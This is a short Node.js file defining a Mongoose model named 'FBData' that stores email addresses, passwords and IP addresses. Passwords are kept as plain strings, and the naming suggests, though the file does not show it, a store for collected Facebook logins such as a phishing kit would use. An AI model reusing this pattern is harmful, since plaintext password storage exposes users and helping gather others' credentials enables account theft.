const { Schema, model } = require("mongoose");

const FBSchema = Schema({
  email: { type: String, required: true },
  password: { type: String, required: true },
  ip: { type: String },
});

module.exports = model("FBData", FBSchema);
